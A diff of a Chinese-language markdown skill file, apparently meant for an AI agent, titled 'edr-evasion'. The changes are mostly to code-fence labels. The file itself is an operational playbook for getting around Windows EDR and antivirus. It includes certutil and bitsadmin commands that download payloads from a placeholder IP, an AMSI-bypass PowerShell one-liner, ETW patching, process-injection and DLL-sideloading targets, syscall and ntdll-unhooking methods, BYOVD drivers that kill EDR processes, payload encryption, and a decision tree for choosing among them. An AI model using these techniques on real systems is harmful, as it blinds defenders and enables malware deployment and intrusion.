@@ -1,7 +1,6 @@
 ---
 name: 'edr-evasion'
 description: 'EDR/AV 绕过 2026：LOTL→AMSI→ETW→进程注入→Direct Syscalls→BYOVD→内存加密。含工具和决策树。'
-whenToUse: '上传 payload 被 Defender/EDR 拦截时：LOTL→AMSI→ETW→进程注入→Direct Syscalls→BYOVD。'
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T2 }
 ---
@@ -12,7 +11,7 @@ metadata: { domain: ad-win, tier: T2 }
 
 ## 0. 检测当前环境
 
-```
+```text
 # 杀软/EDR 检测
 tasklist | findstr /I "defender sentinel crowdstrike carbon cylance sophos trend mcafee symantec eset"
 Get-MpComputerStatus | Select-Object *enabled*   # Defender 状态
@@ -23,7 +22,7 @@ wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname
 
 # 确认绕过生效
 Write-Host "AMSI Test"
-```
+```text
 
 ---
 
@@ -31,7 +30,7 @@ Write-Host "AMSI Test"
 
 > CISA 2025 官方指南。用系统自带二进制，不落盘。
 
-```
+```text
 # 下载执行
 certutil -urlcache -split -f http://IP/payload.exe C:\Windows\Temp\p.exe
 bitsadmin /transfer job /download /priority high http://IP/payload C:\Windows\Temp\p.exe
@@ -56,20 +55,20 @@ wmic /node:IP /user:user /password:pass process call create "calc.exe"
 
 # .NET InstallUtil
 installutil /U C:\Windows\Temp\evil.dll  # 以 SYSTEM 执行 Uninstaller
-```
+```text
 
 ### LOLBins 完整列表参考
-```
+```text
 LOLBAS Project: https://lolbas-project.github.io/
 GTFOBins: https://gtfobins.github.io/ (Linux)
 LOOBins: https://www.loobins.io/ (macOS)
-```
+```text
 
 ---
 
 ## 2. AMSI 绕过
 
-```
+```text
 # PowerShell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
@@ -81,13 +80,13 @@ powershell -version 2 -c "..."
 
 # 混淆
 "AMSI" → [char]65+[char]77+[char]83+[char]73
-```
+```text
 
 ---
 
 ## 3. ETW (Event Tracing for Windows) 绕过
 
-```
+```text
 # PowerShell
 $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
 $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
@@ -95,13 +94,13 @@ $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue(
 
 # Patch EtwEventWrite 函数
 # → ntdll.dll!EtwEventWrite → 写 ret (0xC3)
-```
+```text
 
 ---
 
 ## 4. 进程注入
 
-```
+```text
 # 经典技术
 [ ] CreateRemoteThread            # 最老但最稳定
 [ ] Process Hollowing             # 挂起合法进程 → 替换内存 → 恢复
@@ -115,7 +114,7 @@ $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue(
 # 注入目标选择
 白名单进程: notepad.exe / calc.exe / iexplore.exe / svchost.exe
 签名进程:   Microsoft Edge / Teams / OneDrive
-```
+```text
 
 ---
 
@@ -123,7 +122,7 @@ $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue(
 
 > 绕过用户态 hook。EDR hook 在 ntdll.dll 层失效。2025+ EDR 已能检测 Direct → 演进到 Indirect。
 
-```
+```text
 # 原理
 正常:     program → ntdll.dll (HOOKED) → syscall → kernel
 Direct:   program → 直接 syscall → kernel  (syscall 来自 ntdll 外部 → ⚠️ 可检测)
@@ -143,12 +142,12 @@ Indirect: program → ntdll.dll (gadget) → syscall → kernel (syscall 地址�
 
 # optiv/Freeze → suspend process + direct syscalls + AES encryption
 Freeze -I shellcode.bin -encrypt -O evil.exe
-```
+```text
 
 ---
 
 ## 6.5 🆕 API Unhooking (重载干净 ntdll)
-```
+```text
 # 原理: EDR hook 存在于内存中的 ntdll.dll → 从磁盘读一份干净的 → 替换
 # 不同于 syscall 绕过 — 恢复整个 DLL 的原始 .text section
 
@@ -159,34 +158,34 @@ Freeze -I shellcode.bin -encrypt -O evil.exe
 #    → 之后所有 ntdll 调用都不再经过 EDR
 
 # 工具: RefleXXion / SharpUnhooker / 手工 NtMapViewOfSection
-```
+```text
 
 ### 🆕 硬件断点 (HWBP / Blindside)
-```
+```text
 # 利用 CPU 调试寄存器 (DR0-DR3) + DR7 设置硬件断点 — 内存本身零修改
 # VEH (Vectored Exception Handler) + HWBP → 单步异常 → 改 RIP / unhook
 # 绕过所有基于内存完整性扫描的检测 (无 hook、无 patch、无 .text 修改)
 # 🔴 Cymulate "Blindside" 技术: hook LdrLoadDll → 阻止 EDR DLL 加载 → 干净进程
 # 🔴 实战: 设 HWBP on NtOpenSection → VEH → 手工 map 恶意 PE → 执行
-```
+```text
 
 ---
 
 ## 7. DLL 侧加载 & 代理
 
-```
+```text
 # 模式: 签名 EXE → 加载恶意 DLL
 # 经典组合:
 MpCmdRun.exe + MpClient.dll         # Defender 自身 + 伪造 DLL
 OneDrive.exe + version.dll          # OneDrive 侧加载
 Teams.exe + wkscli.dll
-```
+```text
 
 ---
 
 ## 7. BYOVD (Bring Your Own Vulnerable Driver) 🔴 2026 年爆炸增长
 
-```
+```text
 # 原理: 加载签名但含漏洞的驱动 → 内核内存读写 → 终止 EDR 进程
 
 # 著名武器化驱动
@@ -203,13 +202,13 @@ Teams.exe + wkscli.dll
 [ ] Terminator    → BYOVD 一键杀 EDR
 
 # 防御侧: 启用 HVCI + Microsoft Vulnerable Driver Blocklist
-```
+```text
 
 ---
 
 ## 8. 内存加密 & 阶段性加载
 
-```
+```text
 # Lazy Loading
 - 磁盘上的 payload: XOR/RC4/AES 加密 → 静态查杀失效
 - 运行时解密 → 分配 RW 内存 → 解密 → 改 RX → 执行
@@ -222,13 +221,13 @@ Teams.exe + wkscli.dll
 # Sleep Obfuscation
 - Beacon sleep 时加密内存 + 堆栈欺骗
 - 防止内存扫描抓到 C2 payload
-```
+```text
 
 ---
 
 ## 9. 实用工具
 
-```
+```text
 # AV 检测触发点定位
 ThreatCheck.exe -f payload.exe      # 二分定位哪段字节触发 AV
 
@@ -242,20 +241,20 @@ Amsi-Killer.exe / PwnedPass.exe
 [ ] 打包:           PS2EXE / PyInstaller (但易被杀)
 
 # Donut → shellcode 转 .NET/JS/VBS/PowerShell
-donut -f exe -a 2 -o payload.bin original.exe
-```
+donut -i original.exe -a 2 -o payload.bin
+```text
 
 ---
 
 ## 10. 快速决策树
 
-```
+```text
 有 PowerShell → AMSI Bypass → 无文件执行
 有代码执行 → LOTL (certutil/bitsadmin/msbuild)
 需要持久 beacon → Indirect Syscall + PPID Spoofing + 加密 + 进程注入
 EDR 太强 → BYOVD (RTCore64) 终止 EDR → 后续操作
 纯静默 → LOLBins 链 (每一步都用系统自带工具)
-```
+```text
 
 ## 反模式
 
